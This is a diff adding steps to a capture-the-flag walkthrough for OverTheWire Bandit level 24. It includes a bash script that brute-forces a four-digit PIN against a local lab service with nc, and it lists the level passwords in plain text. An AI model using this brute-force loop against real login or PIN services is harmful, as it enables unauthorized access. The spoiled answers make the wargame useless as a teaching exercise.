@@ -55,3 +55,52 @@ This means we can:
 
 ```bash
 ssh bandit24@bandit.labs.overthewire.org -p 2220
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+Step 2: Create a working directory in /tmp
+bash
+
+bandit24@bandit:~$ cd /tmp
+bandit24@bandit:/tmp$ mkdir bandit24brute
+bandit24@bandit:/tmp$ cd bandit24brute
+
+Step 3: Create a brute-force script
+bash
+
+bandit24@bandit:/tmp/bandit24brute$ cat > brute.sh << 'EOF'
+#!/bin/bash
+
+PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+for PIN in {0000..9999}; do
+    echo "$PASSWORD $PIN"
+done | nc localhost 30002 | grep -v "Wrong"
+EOF
+
+Step 4: Make the script executable
+bash
+
+bandit24@bandit:/tmp/bandit24brute$ chmod +x brute.sh
+
+Step 5: Run the brute-force script
+bash
+
+bandit24@bandit:/tmp/bandit24brute$ ./brute.sh
+
+Output:
+text
+
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+Step 6: Save the password
+bash
+
+echo "bandit25: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4" >> ~/bandit_notes.txt
+
+Step 7: Log into Level 25
+bash
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
